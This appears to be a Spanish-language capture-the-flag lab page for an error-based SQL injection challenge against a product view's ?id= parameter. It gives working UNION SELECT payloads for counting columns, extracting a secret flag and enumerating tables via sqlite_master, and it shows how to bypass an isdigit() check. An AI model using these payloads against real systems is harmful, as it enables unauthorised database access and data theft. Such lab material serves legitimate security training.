CHALLENGE 02

Error-Based SQL Injection

El parámetro ?id= de la vista de producto es vulnerable.
Nivel 1: Los errores SQL se muestran en pantalla — úsalos para enumerar la base de datos.
Nivel 2: Validación débil de tipo numérico que puede eludirse con UNION SELECT.

1
Mensajes de error expuestos
SIN FILTRO

Prueba ?id=1 UNION SELECT 1,secret_flag,3,4,5,6 FROM products--

ACCEDER
2
Validación numérica débil
isdigit() BYPASS

isdigit() falla con espacios. Intenta ?id=1 UNION...

ACCEDER
💡 Técnica: UNION SELECT

Primero determina el número de columnas: ?id=1 ORDER BY 6--
Luego extrae datos: ?id=0 UNION SELECT 1,secret_flag,3,4,5,6 FROM products WHERE id=3--
También puedes enumerar tablas: ?id=0 UNION SELECT 1,name,3,4,5,6 FROM sqlite_master--
